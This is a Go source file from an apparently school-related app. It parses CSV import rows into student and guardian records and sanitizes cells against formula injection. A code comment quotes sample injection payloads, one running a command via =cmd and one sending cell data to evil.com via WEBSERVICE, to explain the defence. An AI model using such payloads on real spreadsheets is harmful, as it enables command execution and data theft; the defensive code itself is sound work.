package importpkg

import (
	"fmt"
	"strconv"
	"strings"

	importModels "github.com/moto-nrw/project-phoenix/models/import"
)

// sanitizeCellValue prevents CSV injection attacks by prefixing formula characters with a single quote
// This forces Excel/LibreOffice to treat the value as text instead of a formula
//
// SECURITY: Protects against injection attacks where malicious formulas (=, +, -, @) could:
//   - Execute arbitrary commands (=cmd|'/c calc'!A1)
//   - Exfiltrate data (=WEBSERVICE("http://evil.com/"&A1))
//   - Access local files (=DDE(...))
//
// Reference: OWASP CSV Injection (https://owasp.org/www-community/attacks/CSV_Injection)
func sanitizeCellValue(value string) string {
	if value == "" {
		return value
	}

	// Check if the value starts with a dangerous character
	firstChar := value[0]
	if firstChar == '=' || firstChar == '+' || firstChar == '-' || firstChar == '@' || firstChar == '\t' || firstChar == '\r' {
		// Prefix with a single quote to force text interpretation
		// This is the standard defense recommended by OWASP
		return "'" + value
	}

	return value
}

// ColumnMapper provides column access functions for import parsing
type ColumnMapper struct {
	mapping map[string]int
	values  []string
}

// NewColumnMapper creates a new column mapper with the given mapping and values
func NewColumnMapper(mapping map[string]int, values []string) *ColumnMapper {
	return &ColumnMapper{mapping: mapping, values: values}
}

// GetCol returns a column value with CSV injection protection
func (m *ColumnMapper) GetCol(colName string) string {
	idx, exists := m.mapping[colName]
	if !exists || idx < 0 || idx >= len(m.values) {
		return "" // Column doesn't exist or out of range
	}
	return sanitizeCellValue(strings.TrimSpace(m.values[idx]))
}

// GetRawCol returns a column value without sanitization (for phone numbers)
// Phone numbers may start with + (international format) which would be corrupted by sanitization
func (m *ColumnMapper) GetRawCol(colName string) string {
	idx, exists := m.mapping[colName]
	if !exists || idx < 0 || idx >= len(m.values) {
		return ""
	}
	return strings.TrimSpace(m.values[idx])
}

// HasColumn checks if a column exists in the mapping
func (m *ColumnMapper) HasColumn(colName string) bool {
	_, exists := m.mapping[colName]
	return exists
}

// ParseBool parses German boolean values ("Ja"/"Nein")
func ParseBool(val string) bool {
	normalized := strings.ToLower(strings.TrimSpace(val))
	return normalized == "ja" || normalized == "yes" || normalized == "true" || normalized == "1"
}

// MapStudentRow maps column values to StudentImportRow using the shared mapping logic
func MapStudentRow(mapper *ColumnMapper) (importModels.StudentImportRow, error) {
	row := importModels.StudentImportRow{
		DataRetentionDays: 30, // Default
	}

	// Map student fields
	row.FirstName = mapper.GetCol("vorname")
	row.LastName = mapper.GetCol("nachname")
	row.SchoolClass = mapper.GetCol("klasse")
	row.GroupName = mapper.GetCol("gruppe")
	row.Birthday = mapper.GetCol("geburtstag")
	row.TagID = mapper.GetCol("rfid")
	row.HealthInfo = mapper.GetCol("gesundheitsinfo")
	row.SupervisorNotes = mapper.GetCol("betreuernotizen")
	row.ExtraInfo = mapper.GetCol("zusatzinfo")
	row.PickupStatus = mapper.GetCol("abholstatus")
	row.BusPermission = ParseBool(mapper.GetCol("bus"))

	// Privacy consent
	row.PrivacyAccepted = ParseBool(mapper.GetCol("datenschutz"))
	if retentionStr := mapper.GetCol("aufbewahrung(tage)"); retentionStr != "" {
		retention, err := strconv.Atoi(retentionStr)
		if err != nil {
			return row, fmt.Errorf("ungültiger Wert für Aufbewahrung(Tage): '%s'. Bitte nur Zahlen verwenden (z.B. 7, 14, 30)", retentionStr)
		}
		row.DataRetentionDays = retention
	}

	// AUTO-DETECT GUARDIANS (Erz1, Erz2, Erz3, ...)
	guardianNum := 1
	for {
		emailKey := fmt.Sprintf("erz%d.email", guardianNum)
		phoneKey := fmt.Sprintf("erz%d.telefon", guardianNum)
		mobileKey := fmt.Sprintf("erz%d.mobil", guardianNum)

		// Check if this guardian number exists
		if !mapper.HasColumn(emailKey) && !mapper.HasColumn(phoneKey) && !mapper.HasColumn(mobileKey) {
			break // No more guardians
		}

		guardian := importModels.GuardianImportData{
			FirstName:          mapper.GetCol(fmt.Sprintf("erz%d.vorname", guardianNum)),
			LastName:           mapper.GetCol(fmt.Sprintf("erz%d.nachname", guardianNum)),
			Email:              mapper.GetCol(emailKey),
			Phone:              mapper.GetRawCol(phoneKey),
			MobilePhone:        mapper.GetRawCol(mobileKey),
			RelationshipType:   mapper.GetCol(fmt.Sprintf("erz%d.verhältnis", guardianNum)),
			IsPrimary:          ParseBool(mapper.GetCol(fmt.Sprintf("erz%d.primär", guardianNum))),
			IsEmergencyContact: ParseBool(mapper.GetCol(fmt.Sprintf("erz%d.notfall", guardianNum))),
			CanPickup:          ParseBool(mapper.GetCol(fmt.Sprintf("erz%d.abholung", guardianNum))),
		}

		// Parse flexible phone numbers into PhoneNumbers array
		guardian.PhoneNumbers = ParseGuardianPhoneNumbers(guardianNum, mapper.GetRawCol)

		// Guardian profile fields (address, professional, preferences)
		guardian.AddressStreet = mapper.GetCol(fmt.Sprintf("erz%d.straße", guardianNum))
		guardian.AddressCity = mapper.GetCol(fmt.Sprintf("erz%d.stadt", guardianNum))
		guardian.AddressPostalCode = mapper.GetCol(fmt.Sprintf("erz%d.plz", guardianNum))
		guardian.Occupation = mapper.GetCol(fmt.Sprintf("erz%d.beruf", guardianNum))
		guardian.Employer = mapper.GetCol(fmt.Sprintf("erz%d.arbeitgeber", guardianNum))
		guardian.Notes = mapper.GetCol(fmt.Sprintf("erz%d.notizen", guardianNum))
		guardian.LanguagePreference = mapper.GetCol(fmt.Sprintf("erz%d.sprache", guardianNum))
		guardian.PreferredContactMethod = parseContactMethod(mapper.GetCol(fmt.Sprintf("erz%d.kontaktart", guardianNum)))
		guardian.EmergencyPriority = parseEmergencyPriority(mapper.GetCol(fmt.Sprintf("erz%d.notfallpriorität", guardianNum)))

		// Only add if has contact info (skip empty guardians)
		hasPhoneNumbers := len(guardian.PhoneNumbers) > 0
		if guardian.Email != "" || guardian.Phone != "" || guardian.MobilePhone != "" || hasPhoneNumbers {
			row.Guardians = append(row.Guardians, guardian)
		}

		guardianNum++
	}

	// Parse pickup schedule (Mon-Fri) with per-day notes
	dayColumns := []struct {
		key      string
		notesKey string
		weekday  int
	}{
		{"abholung.mo", "abholung.mo.notizen", 1},
		{"abholung.di", "abholung.di.notizen", 2},
		{"abholung.mi", "abholung.mi.notizen", 3},
		{"abholung.do", "abholung.do.notizen", 4},
		{"abholung.fr", "abholung.fr.notizen", 5},
	}
	for _, d := range dayColumns {
		timeStr := mapper.GetCol(d.key)
		notes := mapper.GetCol(d.notesKey)
		if timeStr != "" {
			row.PickupSchedules = append(row.PickupSchedules, importModels.PickupScheduleImportData{
				Weekday:    d.weekday,
				PickupTime: timeStr,
				Notes:      notes,
			})
		}
	}

	return row, nil
}

// parseEmergencyPriority parses an emergency priority value, defaulting to 0 on failure
func parseEmergencyPriority(val string) int {
	if val == "" {
		return 0
	}
	priority, err := strconv.Atoi(val)
	if err != nil {
		return 0
	}
	return priority
}

// parseContactMethod validates and returns a preferred contact method
func parseContactMethod(val string) string {
	normalized := strings.ToLower(strings.TrimSpace(val))
	validMethods := map[string]bool{
		"email":  true,
		"phone":  true,
		"mobile": true,
		"sms":    true,
	}
	if validMethods[normalized] {
		return normalized
	}
	return ""
}

// PhoneMapping defines a phone column mapping
type PhoneMapping struct {
	Suffix    string
	PhoneType string
	Label     string
}

// DefaultPhoneMappings returns the standard phone column mappings
func DefaultPhoneMappings() []PhoneMapping {
	return []PhoneMapping{
		{"telefon", "home", ""},
		{"telefon2", "home", ""},
		{"mobil", "mobile", ""},
		{"mobil2", "mobile", ""},
		{"dienstlich", "work", "Dienstlich"},
		{"dienstlich2", "work", "Dienstlich"},
	}
}

// ParseGuardianPhoneNumbers extracts phone numbers from columns into PhoneImportData array
func ParseGuardianPhoneNumbers(guardianNum int, getCol func(string) string) []importModels.PhoneImportData {
	var phones []importModels.PhoneImportData
	priority := 1

	for _, mapping := range DefaultPhoneMappings() {
		colKey := fmt.Sprintf("erz%d.%s", guardianNum, mapping.Suffix)
		value := getCol(colKey)
		if value != "" {
			phones = append(phones, importModels.PhoneImportData{
				PhoneNumber: value,
				PhoneType:   mapping.PhoneType,
				Label:       mapping.Label,
				IsPrimary:   priority == 1,
			})
			priority++
		}
	}

	return phones
}
